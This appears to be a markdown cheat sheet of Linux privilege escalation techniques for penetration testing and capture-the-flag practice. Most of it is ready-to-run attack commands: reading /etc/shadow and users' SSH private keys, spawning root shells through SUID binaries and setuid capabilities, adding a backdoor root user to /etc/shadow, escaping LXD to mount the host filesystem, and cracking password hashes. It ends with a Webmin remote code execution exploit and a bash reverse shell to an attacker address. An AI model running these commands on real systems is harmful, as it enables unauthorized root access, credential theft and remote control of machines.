---
title: Linux Privilege Escalation
desc: 
tags: [Cron, Linux, Mount, PrivEsc, Privilege, RCE, Reverse, Shell, Vim]
alts: [DNS-Pentesting, Docker-Pentesting, Reverse-Shell, Sudo-PrivEsc, Windows-Priviles-Escalation]
render_with_liquid: false
---

## Investigation

1. **Use Automation Tools**

    - **[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS){:target="_blank"}**

    - **[Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester){:target="_blank"}**

    - **[Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration){:target="_blank"}**

2. **OS Information**

    ```sh
    hostname
    # Alias
    hostname -a
    # DNS
    hostname -d
    # IP address for the host name
    hostname -i
    # All IP address for the host
    hostname -I

    uname -a
    # Kernel version
    uname -v
    # OS
    uname -o

    # Current user
    whoami
    id
    groups

    # Environments
    env
    echo $PATH

    # Positional arguments
    echo $0
    echo $1
    echo $2
    ```

3. **Interest Information**

    1. **Use Common Tools**

        ```sh
        # Apache
        cat /var/log/apache2/access.log

        # Bash Files
        cat .bashrc
        cat .bash_history
        cat .bash_profile
        cat .profile

        # Cron jobs
        cat /etc/cron*
        cat /etc/crontab
        cat /etc/cron.d/*
        cat /etc/cron.daily/*
        cat /etc/cron.hourly/*
        cat /etc/cron.monthly/*
        cat /etc/cron.weekly/*
        cat /var/spool/cron/*
        cat /var/spool/cron/crontabs/*
        # List all cron jobs
        crontab -l
        crontab -l -u username

        # Hosts
        cat /etc/hosts
        # LDAP config
        cat /etc/ldap/ldap.conf
        # Messages
        cat /etc/issue
        cat /etc/motd
        # MySQL
        cat /etc/my.cnf
        # Nameserver
        cat /etc/resolv.conf
        # NFS settings
        cat /etc/exports
        # Os kernel version
        cat /proc/version
        cat /etc/*release
        # PAM
        cat /etc/pam.d/passwd
        # Sudo config
        cat /etc/sudoers
        cat /etc/sudoers.d/usersgroup
        # SSH config
        cat /etc/ssh/ssh_config
        cat /etc/ssh/sshd_config
        # Users and passwords
        cat /etc/passwd
        cat /etc/shadow


        # List all processes
        lsof
        # Select IPv[46] files
        lsof -i
        # Select IPv[46] files against specific port
        lsof -i:53
        lsof -i:80
        # Select IPv[46] files against specific port (no port names)
        lsof -i:53 -P
        lsof -i:80 -P
        # Specify user
        lsof -u username


        # Display the currently-running processes.
        ps
        ps aux
        ps aux | grep ping
        ```

    2. **Tcpdump**

        If the process (like ping) is running as root, you may be able to capture the interesting information using tcpdump.

        ```sh
        # -i lo: specify interface (lo: loopback address, localhost)
        # -A: print each packet in ASCII
        tcpdump -i lo -A
        ```

4. **Find Sensitive Information**

    1. **Use Find**

        **"find"** searches files in the real system, but slowly.

        ```sh
        # Sensitive data
        find / -name "*.txt" 2>/dev/null
        find /opt -name "*.txt" 2>/dev/null
        find / -name "authorized_keys" 2>/dev/null
        find / -name "users" 2>/dev/null
        find / -name "*user*" 2>/dev/null
        find / -name "secret.key" -or -name "secret" 2>/dev/null
        find / -name "credential*.txt" 2>/dev/null
        find / -name "*secret*" -or -name "*credential*" 2>/dev/null
        find / -name "*root*" -or -name "*password*" 2>/dev/null
        find / -name "*.key" -or -name "*.db" 2>/dev/null
        find / -name "*data*" 2>/dev/null
        find / -name "*flag*" 2>/dev/null

        # Backup files may contain sensitive information
        find / -name "*backup*" 2>/dev/null

        # Backup files for /etc/shadow.
        # ex. /var/shadow.bak
        find / -name *shadow* 2>/dev/null
        ```

    2. **Use Locate**

        **"locate"** searches from the database on the system. It's faster than "find" but the found information is older.

        ```sh
        locate data
        locate flag
        locate flag*.txt
        locate *flag*
        locate password
        locate *password*
        locate *save*
        locate *save.txt
        locate user.txt
        locate user*
        locate *user*
        locate root.txt
        locate *root*
        locate .db
        locate .txt
        ```

    3. **Use Ls**

        ```sh
        # Find SSH keys
        ls -la /home /root /etc/ssh /home/*/.ssh/; locate id_rsa; locate id_dsa; find / -name id_rsa 2> /dev/null; find / -name id_dsa 2> /dev/null; find / -name authorized_keys 2> /dev/null; cat /home/*/.ssh/id_rsa; cat /home/*/.ssh/id_dsa

        # Root folder of web server
        ls /var/www/
        ```

5. **Find SUID**

    ```sh
    # Option 1
    find / -type f -perm -04000 2>/dev/null
    # Option 2
    find / -type f -perm -u=s 2>/dev/null
    # Option 3
    find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
    ```

    If you'll get some SUID files, research the information of them using **[GTFOBins](https://gtfobins.github.io/){:target="_blank"}**.

    - **Find**

        If the "find" command is set as SUID, you can execute some commands as root privileges.

        ```sh
        find ./ -exec "whoami" \;
        find /etc/shadow -exec cat {} \;
        find /root -exec ls -al {} \;
        ```

6. **Find Writable Directories**

    ```sh
    find / -writable 2>/dev/null | cut -d "/" -f 2,3 | sort -u
    ```

7. **Find Capabilities**

    ```sh
    getcap -r / 2>/dev/null
    ```

    If you got the capabilities of "cap_setuid" from the output like the following, you may be able to get the root privileges.

    ```sh
    # Perl (ex. /usr/bin/perl = cap_setuid+ep)
    perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

    # PHP
    php -r "posix_setuid(0); system('$CMD');"

    # Python (ex. /usr/bin/python = cap_setuid+ep)
    python -c 'import os; os.setuid(0); os.system("/bin/bash")'
    ```

    - **Sec Capabilities**

        ```sh
        setcap cap_setuid+ep /path/to/binary
        ```

        If you found the **setcap** with **SUID**, you can manipulate commands like Python.

        ```sh
        cp /usr/bin/python3 /home/<current-user>/python3
        setcap cap_setuid+ep /home/<current-user>/python3
        ```

        Then get a root shell.

        ```sh
        /home/<current-user>/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
        ```

8. **Get Sensitive Contents in Files**

    ```sh
    grep root ./*
    grep password ./*

    # -e: OR Searching
    grep -e admin -e root -e credential -e password ./*
    grep -e secret -e key /*/*

    # -v: Exclude Searching
    grep -v node_modules /*/*

    # IP Address Searching
    grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" ./*
    ```

9. **Monitor Processes without Root Privileges**

    Using **[pspy](https://github.com/DominicBreuker/pspy){:target="_blank"}**, you can fetch processes even if you’re not root user.

    ```sh
    ./pspy -pf -i 1000
    ```

10. **Crack User Passwords**

    If you can access **/etc/passwd** and **/etc/shadow**, crack users password using **unshadow**.

    1. **Copy Files**

        ```sh
        cp /etc/passwd ./passwd.txt
        cp /etc/shadow ./shadow.txt
        ```

    2. **Combines Two Files**

        ```sh
        unshadow passwd.txt shadow.txt > passwords.txt
        ```

    3. **Crack Passwords**

        ```sh
        john --wordlist=wordlist.txt passwords.txt
        ```

<br />

## Execute Commands as Root Privilege

1. **Change Shebang in Shell Script**

    Add "-p" option at the first line to execute the script as root privilege.

    ```sh
    #!/bin/bash -p
    whoami
    ```

2. **Use the Set User ID (SUID)**

    If you can change permission of the **/bin/bash** , add **SUID** to the file.

    ```sh
    chmod 4755 /bin/bash
    ```

    Then you execute it as root privilege by adding "-p" option.  
    You'll be able to pwn the target shell.

    ```sh
    user@machine:~/$ /bin/bash -p
    root@machine:~/$ whoami
    root
    ```

3. **Doas Command**

    **doas** executes commands as another user. **"doas.conf"** is interesting to privilege escalation.

    ```sh
    doas -u root <command> <arg>
    doas -C /etc/doas.conf
    ```

<br />

## Update Sensitive Information

1. **Change Password of Current User**

    You need to know the current user's password.

    ```sh
    echo -n '<current-password>\n<new-password>\n<new-password>' | passwd
    ```

2. **Add Another Root User to /etc/shadow**

    1. **Generate New Password**

        ```sh
        # -6: SHA512
        openssl passwd -6 -salt salt password
        ```

        Copy the output hash.

    2. **Add New Line to /etc/shadow in Target Machine**

        You need to do as root privileges.

        ```sh
        echo '<new-user-name>:<generated-password-hash>:19115:0:99999:7:::' >> /etc/shadow
        ```

    3. **Switch to New User**

        To confirm, switch to generated new user.

        ```sh
        su <new-user>
        ```

<br />

## LXC/LXD

LXD is a container management extension for Linux Containers (LXC).

1. **Check if You are in the Lxd Group**

    If you belong to the Lxd group, you may be able to the root privileges.

    ```sh
    groups
    id
    ```

2. **Mount the Directory**

    List all images.

    ```sh
    lxc image list
    ```

    Create a new container from an image which you get by "lxc image list".

    ```sh
    lxc init <target-image-name> <arbitrary-container-name> -c security.privileged=true
    ```

    Mount the host's **/** directory onto **/mnt/root** in the container you created.

    ```sh
    lxc config device add <created-container-name> <arbitrary-device-name> disk source=/ path=/mnt/root recursive=true
    ```

3. **Start the Container**

    ```sh
    lxc start <created-container-name>
    ```

4. **Get a Shell**

    ```sh
    lxc exec <created-container-name> /bin/sh
    ```

    Check if you are root.

    ```sh
    whoami
    ```

5. **Retrieve the Sensitive Information in the Mounted Directory**

    ```sh
    cd /mnt/root/
    ```

<br />

## Mount Folders

First of all, show mount info.

```sh
showmount -e <target-ip>
```

1. **Make a New Directory in Your Local Machine**

    This folder is used to mount the target NFS folder.

    ```sh
    mkdir /mnt/share
    ```

2. **Mount the Target NFS Folder to the Directory You Created**

    ```sh
    sudo mount -t nfs <target-ip>:/target/dir /mnt/share -o nolock
    # or
    sudo mount -t nfs -o vers=2 <target-ip>:/target/dir /mnt/share -o nolock
    ```

3. **Check if Mounting Successfully**

    ```sh
    ls /mnt/share
    ```

4. **Clean Up the Mounted Folder**

    After invesitigating the NFS folder, don't forget to unmount and remove the folder you created.

    ```sh  
    umount /mnt/share
    rm -rf /mnt/share
    ```

<br />

## Display the Content of Files You Don't Have Permissions

Using **"more"** command.

1. **Make the Terminal's Window Size Smaller**

2. **Run "more" Command**

    The text like "--More--(60%)" will be appeared.

3. **Press 'v' on Keyboard to Enter Vim Mode**

4. **Enter ':e ~/somefile'**

<br />

## 7. Snapd Vulnerabilities

1. **Version < 2.37 Privilege Escalation**

    - **[CVE-2019-7304](https://www.exploit-db.com/exploits/46361)**


<br />

## Webmin <= 1.920 Remote Code Execution

    ```sh
    git clone https://github.com/MuirlandOracle/CVE-2019-15107
    cd CVE-2019-15107
    python CVE-2019-15107.py <target-ip>

    # -------------------------------------------------

    # Listen on attack machine
    nc -lvnp 4444

    # ------------------------------------------------

    # Reverse Shell on target machine
    bash -i >& /dev/tcp/<attacker-ip>4444 0>&1
    ```